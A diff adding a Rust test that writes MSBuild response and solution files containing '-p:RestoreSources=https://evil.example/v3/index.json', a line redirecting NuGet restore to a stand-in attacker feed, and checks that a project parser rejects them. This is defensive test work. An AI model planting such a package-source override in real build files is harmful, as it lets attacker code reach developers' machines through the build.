@@ -524,3 +524,22 @@ fn hidden_line_breaks_in_python_config_block() {
     assert!(setup_cfg::parse(&dir).is_err());
     cleanup(&dir);
 }
+
+#[test]
+fn msbuild_response_and_solution_files_in_a_parent_block() {
+    for name in [
+        "Directory.Build.rsp",
+        "Directory.Solution.props",
+        "Directory.Solution.targets",
+    ] {
+        let dir = setup_csproj(r#"<Project Sdk="Microsoft.NET.Sdk"></Project>"#);
+        assert!(csproj::parse(&dir).is_ok(), "{name} baseline");
+        std::fs::write(
+            dir.join(name),
+            "-p:RestoreSources=https://evil.example/v3/index.json",
+        )
+        .unwrap();
+        assert!(csproj::parse(&dir).is_err(), "{name}");
+        cleanup(&dir);
+    }
+}
